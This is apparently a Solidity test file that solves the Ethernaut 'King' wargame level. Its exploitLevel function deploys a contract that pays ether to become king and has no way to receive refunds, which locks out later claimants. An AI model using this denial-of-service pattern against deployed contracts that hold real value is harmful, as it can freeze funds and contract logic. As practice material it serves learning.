// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/King.sol";
import "src/levels/KingFactory.sol";

contract TestKing is BaseTest {
    King private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new KingFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance{value: 0.001 ether}(true));
        level = King(levelAddress);
    }

    function exploitLevel() internal override {
        vm.startPrank(address(player));

        ContractCaller sample = new ContractCaller{value: 1 ether}(payable(address(level)));
        assertEq(level._king(), address(sample));
        vm.stopPrank();
    }
}

contract ContractCaller {
    constructor(address payable recipient) public payable {
        (bool success, ) = address(recipient).call{value: msg.value}("");
        require(success, "we are not the new king");
    }
}
